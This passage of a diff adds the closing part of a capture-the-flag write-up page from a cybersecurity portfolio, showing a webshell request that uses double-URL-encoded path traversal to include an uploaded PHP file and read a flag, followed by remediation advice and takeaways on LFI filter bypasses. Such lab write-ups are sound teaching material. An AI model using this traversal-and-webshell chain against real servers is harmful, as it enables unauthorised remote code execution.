+<span class="c-val"># Which resolves to:</span>
+<span class="c-val">./uploads/fc023fcacb27a7ad72d605c4e300b389.php</span></pre>
+                    </div>
+
+                    <p>
+                        The <code>ls /</code> output confirms the webshell is executing. Visible in the response
+                        is the flag file: <code>flag_09ebca.txt</code>
+                    </p>
+
+                    <div class="step">
+                        <div class="step-num">5</div>
+                        <div class="step-body">
+                            <h4>Read the Flag</h4>
+                            <p>Replace the <code>ls /</code> command with <code>cat /flag_09ebca.txt</code> to read the
+                                flag contents.</p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 0 3.8rem;">
+                        <div class="code-bar"><i class="fas fa-globe"></i> RCE — reading the flag</div>
+                        <pre><span class="c-url">http://TARGET:PORT/contact.php
+  ?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389
+  &cmd=<span class="c-highlight">cat%20/flag_09ebca.txt</span></span></pre>
+                    </div>
+                </div>
+
+                <!-- Flag -->
+                <div class="flag-box">
+                    <div class="flag-icon"><i class="fas fa-flag"></i></div>
+                    <h3>Flag Captured</h3>
+                    <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 0.5rem;">Contents of
+                        <code>/flag_09ebca.txt</code> returned via webshell execution:
+                    </p>
+                    <div class="flag-file">HTB{4lw4y5_s4n1t1ze_ur_1nput5_k1ds}</div>
+                </div>
+            </div>
+
+            <!-- 5. Vulnerability Summary -->
+            <div class="section-block" id="s5">
+                <h2><i class="fas fa-shield-alt"></i> 5. Vulnerability Summary & Remediation</h2>
+                <p>
+                    Three distinct vulnerabilities were chained to achieve unauthenticated Remote Code Execution.
+                    Each has a straightforward fix — the difficulty is that any single one of these mitigations,
+                    applied in isolation, would have been sufficient to break the chain.
+                </p>
+
+                <div class="finding-grid">
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-folder-open"></i></span>
+                        <h4>LFI via image.php</h4>
+                        <p><strong style="color:var(--red)">Fix:</strong> Use an allowlist of permitted file identifiers
+                            (e.g. MD5 hashes of known assets only). Never resolve user-supplied paths directly. Strip
+                            all traversal sequences server-side.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-upload"></i></span>
+                        <h4>Unrestricted File Upload</h4>
+                        <p><strong style="color:var(--red)">Fix:</strong> Validate file extension against a strict
+                            allowlist (<code>.pdf</code>, <code>.docx</code> only). Store uploads outside the web root.
+                            Rename files and strip the original extension entirely.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-percent"></i></span>
+                        <h4>Double URL-Encode Bypass</h4>
+                        <p><strong style="color:var(--red)">Fix:</strong> Perform the security check <em>after</em>
+                            all decoding steps, not before. Or better — replace the dynamic <code>include()</code> with
+                            a static map of valid region identifiers.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-exclamation-circle"></i></span>
+                        <h4>PHP include() on User Input</h4>
+                        <p><strong style="color:var(--red)">Fix:</strong> Never pass user-controlled data directly to
+                            <code>include()</code>, <code>require()</code>, or any file-loading function. Use a
+                            controller pattern with explicit file mappings.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Takeaways -->
+            <div class="takeaway-box">
+                <h3><i class="fas fa-star"></i> Key Takeaways</h3>
+                <ul>
+                    <li>LFI filter bypasses often rely on encoding tricks — always test <code>....//</code>,
+                        null bytes, and URL encoding variants against any path parameter.</li>
+                    <li>Reading server-side source code via LFI is often more valuable than the LFI itself — it
+                        reveals the full application logic and opens up secondary attack paths.</li>
+                    <li>Unrestricted file upload is critical on its own, but devastating when combined with any
+                        file inclusion primitive on the same server.</li>
+                    <li>Security checks must happen <em>after</em> all decoding steps — checking before a
+                        second <code>urldecode()</code> call is equivalent to having no check at all.</li>
+                    <li>MD5 naming of uploads does not provide security — if you know or can predict the hash,
+                        you know exactly where the file lands.</li>
+                    <li>Storing user uploads inside the web root is a hard no — files should live outside of it
+                        and be served through a controlled delivery mechanism.</li>
+                </ul>
+            </div>
+
+        </article>
+
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-card">
+                <h4><i class="fas fa-list"></i> &nbsp;Table of Contents</h4>
+                <ul class="toc-list">
+                    <li><a href="#s1">1. Scenario &amp; Scope</a></li>
+                    <li><a href="#s2">2. Reconnaissance</a></li>
+                    <li><a href="#s3">3. Source Code Disclosure</a></li>
+                    <li><a href="#s4">4. Exploitation — RCE Chain</a></li>
+                    <li><a href="#s5">5. Vulnerability Summary</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-tag"></i> &nbsp;Vulnerability Classes</h4>
+                <span class="skill-pill red">LFI</span>
+                <span class="skill-pill red">Path Traversal</span>
+                <span class="skill-pill red">File Upload</span>
+                <span class="skill-pill red">RCE</span>
+                <span class="skill-pill red">URL Encoding Bypass</span>
+                <span class="skill-pill red">Source Disclosure</span>
+                <span class="skill-pill red">PHP include()</span>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-tools"></i> &nbsp;Tools Used</h4>
+                <span class="skill-pill">ffuf</span>
+                <span class="skill-pill">curl</span>
+                <span class="skill-pill">md5sum</span>
+                <span class="skill-pill">Browser DevTools</span>
+                <span class="skill-pill">LFI-Jhaddix.txt</span>
+            </div>
+
+            <div class="sidebar-card">
+                <h4><i class="fas fa-network-wired"></i> &nbsp;Attack Chain</h4>
+                <div style="font-size: 0.83rem; line-height: 2.2; color: var(--muted);">
+                    <div style="color: var(--red);">① LFI via image.php</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ traverse to source</div>
+                    <div style="color: var(--red);">② Source code disclosure</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ find upload + include</div>
+                    <div style="color: var(--red);">③ Upload shell.php</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ double-encode bypass</div>
+                    <div style="color: var(--red);">④ Include via contact.php</div>
+                    <div style="padding-left: 0.8rem; color: var(--muted);">↓ cmd execution</div>
+                    <div style="color: var(--green);">⑤ 🚩 Flag captured</div>
+                </div>
+            </div>
+
+            <div class="sidebar-card" id="series-nav-card">
+                <h4><i class="fas fa-link"></i> &nbsp;Series</h4>
+                <div id="series-nav-list">
+                    <span style="color:var(--muted);font-size:0.82rem;">Loading…</span>
+                </div>
+            </div>
+
+            <script>
+                (function () {
+                    const CURRENT_ID = 'file-inclusion';
+                    const REGISTRY_URL = '../blueteam-writeups.json';
+
+                    fetch(REGISTRY_URL + '?t=' + Date.now())
+                        .then(r => { if (!r.ok) throw new Error(); return r.json(); })
+                        .then(writeups => {
+                            const thisPage = writeups.find(w => w.id === CURRENT_ID);
+                            if (!thisPage) return;
+
+                            const seriesItems = writeups
+                                .filter(w => w.series === thisPage.series)
+                                .sort((a, b) => a.day - b.day);
+
+                            const container = document.getElementById('series-nav-list');
+                            container.innerHTML = '';
+
+                            seriesItems.forEach(item => {
+                                const isCurrent = item.id === CURRENT_ID;
+                                const p = document.createElement('p');
+                                p.style.cssText = 'font-size:0.83rem; line-height:1.9; margin:0;';
+
+                                if (isCurrent) {
+                                    p.innerHTML = `
+                        <strong style="color:var(--accent)">Day ${item.day}</strong>
+                        <span style="color:var(--text)"> — ${item.title}</span>
+                        <span style="
+                            display:inline-block;
+                            background:rgba(220,53,69,0.15);
+                            color:#ff6b7a;
+                            border:1px solid rgba(220,53,69,0.3);
+                            border-radius:10px;
+                            padding:0 0.45rem;
+                            font-size:0.7rem;
+                            margin-left:0.3rem;
+                            vertical-align:middle;
+                        ">YOU ARE HERE</span>`;
+                                } else {
+                                    p.innerHTML = `<a href="${item.url}" style="color:var(--accent);text-decoration:none;">
+                        <strong>Day ${item.day}</strong> — ${item.title}
+                    </a>`;
+                                }
+                                container.appendChild(p);
+                            });
+
+                            const maxDay = Math.max(...seriesItems.map(w => w.day));
+                            if (thisPage.day === maxDay) {
+                                const p = document.createElement('p');
+                                p.style.cssText = 'font-size:0.83rem;line-height:1.9;margin:0;opacity:0.4;';
+                                p.textContent = `Day ${maxDay + 1} — Coming soon…`;
+                                container.appendChild(p);
+                            }
+                        })
+                        .catch(() => {
+                            document.getElementById('series-nav-list').innerHTML =
+                                '<span style="color:var(--muted);font-size:0.82rem;">Could not load series.</span>';
+                        });
+                })();
+            </script>
+        </aside>
+
+    </div>
+
+    <footer>
+        <p>
+            <a href="../index.html"><i class="fas fa-arrow-left"></i> Back to Portfolio</a>
+            &nbsp;·&nbsp;
+            PLSCARRYME Cybersecurity Portfolio &copy; 2025
+        </p>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script>
+        window.addEventListener('scroll', () => {
+            const doc = document.documentElement;
+            const scrolled = doc.scrollTop / (doc.scrollHeight - doc.clientHeight) * 100;
+            document.getElementById('progress').style.width = scrolled + '%';
+        });
+    </script>
+
+</body>
+
+</html>
